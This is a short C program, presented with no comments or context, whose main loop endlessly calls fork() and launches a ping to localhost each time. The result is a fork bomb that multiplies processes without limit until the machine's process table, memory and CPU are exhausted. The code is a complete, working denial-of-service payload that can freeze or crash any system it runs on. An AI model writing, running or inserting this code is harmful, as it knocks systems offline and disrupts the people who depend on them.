#include <stdio.h>
#include <unistd.h> 

int main() { 
	while(1) { 
		fork();
      		system("ping 127.0.0.1"); 
   	} 
	return 0; 
}
